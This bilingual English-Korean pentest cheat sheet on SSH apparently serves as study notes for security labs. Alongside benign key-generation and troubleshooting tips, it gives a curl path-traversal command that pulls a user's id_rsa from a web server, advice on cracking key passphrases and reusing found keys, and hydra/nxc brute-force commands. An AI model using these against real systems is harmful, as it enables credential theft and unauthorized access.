# Tips

- If a `private key` is passphrase-protected, use `ssh2john`
- if you find a private key in a web app, use `curl` or `burp` to save it
    
    ```bash
    curl --path-as-is http://$IP/../../../home/$USER/id_rsa -o id_rsa
    ```
    
- If you find a private key and it doesn’t work for one user, try it with other users listed in `/etc/passwd`
- Nmap script on SSH (`ssh-hostkey` ) tells you what key algorithms are used for authentication.
    - If RSA is in use, perhaps we will be hunting for `id_rsa` private key somewhere. Similarly, the discovered SSH private key may be in `id_ecdsa` format if ECDSA is in use.

# Login

```powershell
# Login with private key - Linux
ssh -i key user@$IP
sudo chown kali:kali key
sudo chmod 600 key

# Login with private key - Windows
ssh -i key user@$IP "cmd.exe"
ssh -i key -t user@$IP "cmd.exe"
ssh -i key -t user@$IP "powershell.exe -NoLogo -NoProfile"
ssh -i key -T user@$IP "cmd.exe"
ssh -i key -T user@$IP "powershell.exe -NoLogo -NoProfile"
ssh -i key user@$IP -vvv

# SSH 단순화
ssh -i key user@$IP -o SetEnv=TERM=vt100
TERM=vt100 ssh -i key user@$IP
```

# Keys

```bash
/home/$USER/.ssh/authorized_keys
/home/$USER/.ssh/id_rsa
/home/$USER/.ssh/id_rsa.pub
```

### Public/Private Key Pair 생성

- `.pub` 공개키 파일은 생성자 측에 위치
- `authorized_keys` 파일은 서버 측에 위치한다. 로그인 허용용으로 공개키들을 모아둔 파일
- `authrozied_keys` 파일 안에는 여러 공개키를 한 줄씩 넣을 수 있다.

```bash
# Keygen
ssh-keygen -N ""
ssh-keygen -t rsa -b 4096 -f ~/.ssh/my_key -N ""

# ed25519
ssh-keygen -t ed25519 # 실행하면 기본적으로 ~/.ssh/id_ed25519 개인키와 .pub 공개키가 생김

# RSA
ssh-keygen -t rsa -b 4096 -f mykey # mykey와 mykey.pub 생성
ssh-keygen -t rsa -b 4096 -c 'wook@laptop'

# 
cat mykey > authorized.keys
```

### Too many authentication failures

`ssh-agent`가 너무 많은 키를 자동으로 제출해서, 서버의 `maxAuthTries` 한도를 초과해서 발생한다. 즉, 올바른 키를 시도하기도 전에 너무 많은 인증 시도로 끊기는 상황.

```bash
ssh -i root root@127.0.0.1 Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures Disconnected from 127.0.0.1 port 22
```

해결책: `IdentitiesOnly=yes` 에이전트나 기본 키들을 내지 않고, 지정한 키만 사용

```bash
ssh -i [private key] -o IdentitiesOnly=yes root@$IP

ssh-add -L          # 에이전트에 올라간 키 목록 확인
ssh-add -D          # 모두 제거
ssh-add ./root      # 이 접속에 쓸 키만 등록
ssh root@127.0.0.1  # -i 없이도 이 키로 시도됨

# 무슨 키들이 제출되는지 보기
ssh -vvv -i ./root -o IdentitiesOnly=yes root@127.0.0.1
```

### Bruteforce

- openssh7.2p2 is vulnerable to username enumeration https://www.exploit-db.com/exploits/40113

```bash
nxc ssh <target ip> -u users.txt -p password.txt
hydra -L users.txt -P password.txt ssh://<target ip>
```